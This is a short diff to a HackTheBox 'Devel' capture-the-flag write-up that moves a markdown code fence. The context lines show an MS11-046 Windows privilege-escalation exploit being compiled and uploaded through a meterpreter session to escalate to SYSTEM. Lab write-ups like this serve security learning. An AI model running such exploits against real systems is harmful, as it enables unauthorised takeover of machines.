@@ -226,10 +226,9 @@ ms11-046.c                                              [ <=>                   
 2020-11-21 13:01:17 (225 MB/s) - ‘ms11-046.c’ saved [32674]
 ─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~/writeups_public/HackTheBox/HTB_Devel]
 └──╼ [★]$ i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
-
+```
 ### 6. Escalate to system
 
-```
 Upload the file through the meterpreter session and run it.
 ```bash
 meterpreter > upload ms11-046.exe
